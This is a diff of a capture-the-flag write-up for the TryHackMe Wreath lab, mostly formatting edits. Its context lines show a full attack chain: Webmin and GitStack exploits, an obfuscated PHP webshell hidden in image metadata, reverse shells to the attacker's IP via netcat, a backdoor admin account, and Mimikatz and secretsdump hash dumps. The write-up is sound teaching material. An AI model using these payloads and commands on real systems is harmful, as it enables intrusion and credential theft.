@@ -6,7 +6,7 @@ difficulty: Medium
 os: Multi (Linux/Windows)
 tags: [tryhackme, linux, windows, web, pivoting, lateral-movement, privilege-escalation, active-directory]
 summary: "Multi-machine network featuring pivoting techniques, exploiting Webmin CVE-2019-15107 for initial access, GitStack RCE for lateral movement, and unquoted service path privilege escalation on Windows."
-thumbnail: /assets/images/wreath.png
+thumbnail: /assets/images/thumbnails/wreath.png
 read_time: 25
 ---
 
@@ -15,6 +15,7 @@ read_time: 25
 THM Wreath is a multi-machine network environment that demonstrates advanced penetration testing techniques including network pivoting, lateral movement, and privilege escalation across both Linux and Windows systems.
 
 The attack path involves:
+
 1. Exploiting Webmin on the initial Linux target
 2. Pivoting into an internal network
 3. Compromising a Windows Git server
@@ -22,8 +23,6 @@ The attack path involves:
 5. Privilege escalation via unquoted service path
 
 This writeup walks through the complete attack chain step by step.
-
----
 
 ## Initial Reconnaissance
 
@@ -36,6 +35,7 @@ nmap -T3 -A -oN wreath-scan.txt 10.200.180.200
 ```
 
 **Results:**
+
 ```
 PORT      STATE  SERVICE    VERSION
 22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
@@ -53,17 +53,16 @@ PORT      STATE  SERVICE    VERSION
 
 ### Webmin Analysis (Port 10000)
 
-The service that immediately stood out was **Webmin** running on port **10000**.
+The service that immediately stood out was Webmin running on port 10000.
 
 **Key Information:**
+
 - Service: MiniServ 1.890 (Webmin httpd)
 - Known Vulnerability: CVE-2019-15107
 - Risk Level: Critical (Unauthenticated RCE)
 - Privileges: Typically runs as root
 
-Webmin is a web-based system administration tool that often runs with elevated privileges. The identified version (1.890) is vulnerable to **CVE-2019-15107**, an unauthenticated remote command execution vulnerability that could provide immediate root access.
-
----
+Webmin is a web-based system administration tool that often runs with elevated privileges. The identified version (1.890) is vulnerable to CVE-2019-15107, an unauthenticated remote command execution vulnerability that could provide immediate root access.
 
 ## Initial Access - Webmin Exploitation
 
@@ -76,6 +75,7 @@ Exploited the Webmin vulnerability using a public exploit:
 ```
 
 **Exploit Output:**
+
 ```
         __        __   _               _         ____   ____ _____ 
         \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
@@ -121,8 +121,6 @@ nc -lvnp 5555
 
 **Result:** Root shell obtained on the first target!
 
----
-
 ## Persistence - SSH Key Extraction
 
 Although root access was achieved, persistent access via SSH was preferred over relying on unstable reverse shells.
@@ -135,6 +133,7 @@ ls -la
 ```
 
 **Found:**
+
 ```
 total 16
 drwx------. 2 root root   80 Jan  6  2021 .
@@ -151,8 +150,6 @@ Extracted the private key and established persistent SSH access:
 ssh -i root_ssh root@10.200.180.200
 ```
 
----
-
 ## Internal Network Enumeration
 
 ### Network Discovery
@@ -164,6 +161,7 @@ ip a
 ```
 
 **Output:**
+
 ```
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN
     inet 127.0.0.1/8 scope host lo
@@ -175,7 +173,7 @@ The host is on the `10.200.180.0/24` network, indicating potential internal targ
 
 ### Setting Up Network Pivot
 
-Established a pivot using `sshuttle`:
+Established a pivot using sshuttle:
 
 ```bash
 sudo sshuttle -r root@10.200.180.200 \
@@ -185,6 +183,7 @@ sudo sshuttle -r root@10.200.180.200 \
 ```
 
 **Result:**
+
 ```
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 c : Connected to server.
@@ -192,21 +191,20 @@ c : Connected to server.
 
 ### Internal Network Scanning
 
-Since ICMP was filtered, uploaded a static `nmap` binary to scan locally:
+Since ICMP was filtered, uploaded a static nmap binary to scan locally:
 
 ```bash
 ./nmap-1 -sn 10.200.180.0/24
 ```
 
 **Discovered Hosts:**
+
 ```
 10.200.180.1    Host is up
 10.200.180.100  Host is up
 10.200.180.150  Host is up
 10.200.180.200  Host is up (current host)
 ```
-
----
 
 ## Lateral Movement - GitStack Server (10.200.180.150)
 
@@ -217,6 +215,7 @@ Since ICMP was filtered, uploaded a static `nmap` binary to scan locally:
 ```
 
 **Open Ports:**
+
 ```
 80/tcp   open  http
 3389/tcp open  ms-wbt-server
@@ -227,15 +226,14 @@ RDP and WinRM required credentials, so focus shifted to the HTTP service.
 
 ### GitStack Vulnerability Discovery
 
-The web server was running **GitStack**, a Git repository management application.
-
-Searching for exploits:
+The web server was running GitStack, a Git repository management application. Searching for exploits:
 
 ```bash
 searchsploit gitstack
 ```
 
 **Found:**
+
 ```
 GitStack 2.3.10 - Remote Code Execution  |  php/webapps/43777.py
 ```
@@ -255,6 +253,7 @@ python3 43777.py
 ```
 
 **Output:**
+
 ```
 [+] Found user: twreath
 [+] Found repository: Website
@@ -270,11 +269,10 @@ curl -X POST http://10.200.180.150/web/exploit_el.php -d "a=whoami"
 ```
 
 **Result:**
+
 ```
 nt authority\system
 ```
-
----
 
 ## Reverse Shell via Relay
 
@@ -298,6 +296,7 @@ curl -X POST http://10.200.180.150/web/exploit_el.php \
 Since direct connection failed, configured a relay through the first compromised host (.200):
 
 **Network Flow:**
+
 ```
 .150 (WebShell) --> .200 (Relay) --> Attacker
 ```
@@ -338,8 +337,6 @@ connect to [10.250.180.3] from (UNKNOWN) [10.200.180.200] 38972
 PS C:\GitStack\gitphp>
 ```
 
----
-
 ## Persistence on GitStack Server
 
 ### Creating Local Admin Account
@@ -353,6 +350,7 @@ net localgroup "Remote Management Users" elliot /add
 ```
 
 **Results:**
+
 ```
 The command completed successfully.
 The command completed successfully.
@@ -360,10 +358,9 @@ The command completed successfully.
 ```
 
 **Access Granted:**
-- `Administrators` → Full local control
-- `Remote Management Users` → WinRM access
 
----
+- Administrators → Full local control
+- Remote Management Users → WinRM access
 
 ## Post-Exploitation - Credential Harvesting
 
@@ -390,6 +387,7 @@ mimikatz # lsadump::sam
 ```
 
 **Extracted Hashes:**
+
 ```
 User : Administrator
 NTLM : 37db630168e5f82aafa8461e05c6bbd1
@@ -409,13 +407,12 @@ evil-winrm -i 10.200.180.150 \
 ```
 
 **Result:**
+
 ```
 Evil-WinRM shell v3.9
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
-
----
 
 ## Final Target Enumeration (10.200.180.100)
 
@@ -428,6 +425,7 @@ Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 50
 ```
 
 **Results:**
+
 ```
 Hostname      : 10.200.180.100
 alive         : True
@@ -460,11 +458,10 @@ netsh advfirewall firewall add rule name="port-fwd" \
 ```
 
 **Result:**
+
 ```
 2026/01/05 22:27:04 client: Connected (Latency 174.480098ms)
 ```
-
----
 
 ## Source Code Analysis
 
@@ -494,6 +491,7 @@ done
 ```
 
 **Commit Messages:**
+
 ```
 0-70dde80cc19ec76704567996738894828f4ee895
 Static Website Commit
@@ -513,8 +511,6 @@ find . -name "*.php"
 
 **Found:** `./resources/index.php`
 
----
-
 ## Vulnerability Analysis - File Upload
 
 ### Code Review
@@ -532,17 +528,17 @@ if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
 ### Identified Vulnerabilities
 
 **1. Weak Image Validation:**
+
 - Uses `getimagesize()` which only checks file headers
 - Can be bypassed by embedding PHP in image metadata
 
 **2. Flawed Extension Check:**
-- Only validates the **second element** after splitting on `.`
+
+- Only validates the second element after splitting on `.`
 - Filename `image.jpeg.php` bypasses the filter:
   - Split result: `["image", "jpeg", "php"]`
   - Only checks index `[1]` → `"jpeg"` ✓
   - Final extension `.php` is ignored
-
----
 
 ## Exploitation - File Upload Bypass
 
@@ -562,7 +558,7 @@ die();
 
 ### Embedding in Image
 
-Using `exiftool` to inject payload into EXIF metadata:
+Using exiftool to inject payload into EXIF metadata:
 
 ```bash
 exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" war.jpeg.php
@@ -579,8 +575,6 @@ http://10.200.180.100/resources/uploads/war.jpeg.php?wreath=systeminfo
 ```
 
 **Result:** Command execution successful!
-
----
 
 ## Reverse Shell on Final Target
 
@@ -614,8 +608,6 @@ powershell.exe c:\windows\temp\nc-elliot.exe 10.250.180.3 7777 -e cmd.exe
 
 **Result:** Shell obtained as low-privileged user!
 
----
-
 ## Privilege Escalation Enumeration
 
 ### Checking Privileges
@@ -641,6 +633,7 @@ wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows
 ```
 
 **Found Vulnerable Service:**
+
 ```
 SystemExplorerHelpService
 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
@@ -655,7 +648,8 @@ sc qc SystemExplorerHelpService
 ```
 
 **Key Details:**
-- Runs as: `SYSTEM`
+
+- Runs as: SYSTEM
 - Path: Unquoted with spaces
 - Start Type: Automatic
 
@@ -667,21 +661,21 @@ get-acl "C:\Program Files (x86)\System Explorer" | fl
 
 **Result:** `BUILTIN\Users` has write access
 
----
-
 ## Privilege Escalation - Unquoted Service Path
 
 ### Understanding the Vulnerability
 
 For the path:
+
 ```
 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
 ```
 
 Windows tries:
+
 1. `C:\Program.exe` (not writable)
 2. `C:\Program Files (x86)\System.exe` (not writable)
-3. `C:\Program Files (x86)\System Explorer\System.exe` (**writable!**)
+3. `C:\Program Files (x86)\System Explorer\System.exe` (writable!)
 
 ### Creating Malicious Executable
 
@@ -717,6 +711,7 @@ mv Wrapper.exe System.exe
 ### Deploying the Exploit
 
 Uploaded `System.exe` to:
+
 ```
 C:\Program Files (x86)\System Explorer\System.exe
 ```
@@ -742,8 +737,6 @@ sc start SystemExplorerHelpService
 C:\Windows\system32>whoami
 nt authority\system
 ```
-
----
 
 ## Post-Exploitation - Hash Extraction
 
@@ -782,12 +775,11 @@ Using secretsdump:
 ```
 
 **Dumped Hashes:**
+
 ```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
 Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
 ```
-
----
 
 ## Attack Chain Summary
 
@@ -825,8 +817,6 @@ Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
            └─> Hash Extraction
 ```
 
----
-
 ## Lessons Learned
 
 ### Technical Insights
@@ -843,23 +833,24 @@ Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
 3. Prefer offline hash extraction to avoid AV detection
 4. Document complete attack chains for reporting
 
----
-
 ## Remediation Recommendations
 
 ### Critical
 
 **1. Patch Webmin**
+
 - Update to latest version
 - Implement network segmentation
 - Restrict access to management interfaces
 
 **2. Fix GitStack Vulnerability**
+
 - Update to patched version
 - Implement authentication controls
 - Restrict network access
 
 **3. Secure File Upload**
+
 - Validate file content, not just extensions
 - Implement strict MIME type checking
 - Store uploads outside web root
@@ -868,16 +859,16 @@ Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
 ### High Priority
 
 **4. Fix Unquoted Service Paths**
+
 - Quote all service executable paths
 - Review permissions on Program Files
 - Implement least privilege for services
 
 **5. Credential Protection**
+
 - Enable Credential Guard
 - Restrict local admin accounts
 - Implement LAPS for local passwords
-
----
 
 ## Tools Used
 
@@ -891,15 +882,11 @@ Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
 | Mimikatz | Credential extraction | 2.2.0 |
 | Impacket | Windows protocol tools | 0.13.0 |
 
----
-
 ## Flags
 
 **Target .200 (Root):** ✓ Compromised  
 **Target .150 (Administrator):** ✓ Compromised  
 **Target .100 (SYSTEM):** ✓ Compromised
-
----
 
 ## Timeline
 
@@ -917,8 +904,6 @@ Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
 | 06:30 | Final hashes extracted |
 
 **Total Time:** ~6.5 hours
-
----
 
 ## References
 
